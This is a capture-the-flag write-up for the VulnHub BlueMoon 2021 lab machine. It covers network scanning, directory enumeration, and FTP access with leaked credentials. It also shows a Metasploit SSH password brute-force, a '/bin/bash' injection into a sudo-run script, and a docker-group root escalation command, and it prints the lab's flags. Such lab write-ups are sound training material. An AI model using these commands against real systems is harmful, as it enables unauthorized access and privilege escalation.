# VulnHub Writeup: BlueMoon 2021

## Target Information
* **Hostname:** BlueMoon 
* **Target IP:** 192.168.0.142 
* **Operating System:** Debian GNU/Linux 10 
* **Attacker IP:** 192.168.0.162

## 1. Network Discovery
Netdiscover sends ARP requests on the LAN. Every machine that’s online answers with its IP + MAC address. This is how we spot the target:
  
```bash
netdiscover
```

We found out that IP for target is: 192.168.0.142

## 2. Port Scanning
A detailed Nmap scan was executed using the command :

```bash
nmap 192.168.0.142
```

* The scan discovered an open port ``22/tcp`` running the SSH service, specifically ``OpenSSH 7.9p1``.
* An open port ``80/tcp`` was found running the HTTP service with ``Apache httpd 2.4.38``.
* Additionally, an open port ``21/tcp`` was discovered running the FTP service with ``vsftpd 3.0.3``.

## 3. Web Enumeration

`gobuster` were used to thoroughly enumerate web directories and files on the target server.

First, open the website by typing in url http://192.168.0.142

* Navigating to the main webpage `http:// 192.168.0.142 /index.html` displayed the text "THE GAME BEGINS".

Then, `gobuster` was used for additional directory enumeration using the following command:

```bash
gobuster dir -u http://192.168.0.142 \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

This scan discovered the `/hidden_text` directory with a 200 OK status.

* Navigating to the discovered `/hidden_text` path revealed a maintenance page stating: "Maintanance! Sorry For Delay, We Will Recover Soon. Thank You...".
* After clicking the text on that page, the website provided a `QR code`.
* Scanning the `QR code` revealed a bash script containing FTP login credentials: `USER=userftp` and `PASSWORD=ftpp@ssword`

## 4. FTP Enumeration
A connection to the FTP server was initiated from the attacker terminal using the command :

```bash
ftp 192.168.0.142
```
  
The login was successfully using username `userftp` and password `ftpp@ssword`.

The `ls` command was used to check the file system, revealing two files :
* `information.txt`
* `p_lists.txt`.

The files were downloaded using

```bash
get information.txt
get p_lists.txt
```

## 5. Analyzing Downloaded Files
Display the `information.txt` contents file using command :

```bash
cat information.txt
```

* The file contained a message to `robin` regarding their password weakness and noted that a `password list` was provided.

Display the `p_lists.txt` contents file using command command :

```bash
cat p_lists.txt
```

* The file contained `password list`.

## 6. Initial Access (SSH Brute-Force)
Metasploit’s SSH login module was used against the SSH service with the command :

```bash
msfconsole
search ssh_login
```
Then you configured options (RHOSTS, USERNAME, PASS_FILE) and obtained the correct password.

```bash
set RHOSTS 192.168.0.142
set PASS_FILE p_lists.txt
set USERNAME robin
run
```

* Metasploit successfully found a valid password for the user `robin`: `k4rv3ndh4nh4ck3r`.
* An SSH connection was established using the command `ssh robin@192.168.0.142 `.

## 7. Capturing Flags
You listed files and got the first flag.

```bash
ls
cat user1.txt
```

Now you got first flag: Fl4g{u5se1r34ch3d5ucc355fully}

## 8. Privilege Escalation: Robin to Jerry

Check the user's privileges using the command :

```bash
sudo -l
```

sudo -l reveals if your user can run commands as someone else without knowing their password.

Use this command to execute as `Jerry` :

```bash
sudo -u jerry ./feedback.sh
```

When running the feedback script, `test` was entered as the name, and `/bin/bash` was injected into the feedback prompt for the target machine.
* Run through the command to find user2.txt as a second flag inside it.
Now u got the second flag: Fl4g{y0ur34ch3du53r25uc355ful1y}

## 8. Privilege Escalation: Jerry to Root
The `id` command revealed that the user `jerry` was a member of the `docker` group (gid 114).

This privilege was exploited by running a Docker container to mount the root directory using the command :

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Change directory to root using :

```bash
cd /root
```

The contents of the root directory were listed using the command:

```Bash
ls
```

* This reveals the `root.txt` file.

The root flag file was read using the command:

```bash
cat root.txt
```

The final Root-Flag discovered was : `Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}`
